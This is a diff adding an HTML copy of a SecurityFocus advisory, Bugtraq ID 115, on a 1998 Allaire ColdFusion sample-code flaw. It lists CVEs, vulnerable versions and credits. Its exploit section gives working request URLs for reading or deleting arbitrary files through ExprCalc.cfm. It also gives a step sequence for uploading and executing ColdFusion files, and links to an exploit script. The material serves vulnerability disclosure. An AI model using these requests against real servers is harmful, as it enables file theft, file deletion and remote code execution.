@@ -1,0 +1,124 @@
+<p><b><span style="font-size: 18pt;">Allaire ColdFusion Remote File Display, Deletion, Upload and Execution Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/115/info">info</a><br><a href="http://www.securityfocus.com/bid/115/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/115/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/115/solution">solution</a><br><a href="http://www.securityfocus.com/bid/115/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				115
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Origin Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-1999-0455<br/>
+				
+					CVE-1999-0477<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 25 1998 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 12:16AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				rain.forest.puppy &lt;rfpuppy@iname.com&gt; made public the ability to display and delete any file on the system in Phrack Issue 54 Article 8.
+
+kklinsky@themerge.com made public the ability to upload and execute arbitrary ColdFusion files in a L0pht advisory.
+Ad
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Allaire ColdFusion Server 4.0 <br/>
+					
+				
+					Allaire ColdFusion Server 3.1.2 <br/>
+					
+				
+					Allaire ColdFusion Server 3.1.1 <br/>
+					
+				
+					Allaire ColdFusion Server 3.1 <br/>
+					
+				
+					Allaire ColdFusion Server 3.0.1 <br/>
+					
+				
+					Allaire ColdFusion Server 3.0 <br/>
+					
+				
+					Allaire ColdFusion Server 2.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Allaire ColdFusion Server 4.0.1 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/115/mole.cfm">#exploit</a><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	To display and delete any file on the system use an URL of the following form:<br/><br/>http://www.victim.test/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=C:\the\target\file<br/><br/>To upload files to the sever first find out the location of the sample code on the server by uploading a dummy file by using http://www.victim.test/cfdocs/expeval/openfile.cfm. After uploading a dummy file it will be displayed for you. The URL will be for the form:<br/><br/>http://www.victim.test/cfdocs/expeval/ExprCalc.cfm?RequestTimeout=2000&amp;amp;OpenFilePath=C:\Inetpub\wwwroot\cfdocs\expeval\.\dummy.txt<br/><br/>Now replace the "dummy.txt" string by "ExprCalc.cfm" to delete that file. We can now upload and execute ColdFusion files in the server without them being deleted.
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/mole.cfm">/data/vulnerabilities/exploits/mole.cfm</a></li>
+<li><a href="/data/vulnerabilities/exploits/">/data/vulnerabilities/exploits/</a></li>
+</ul>
+</div>
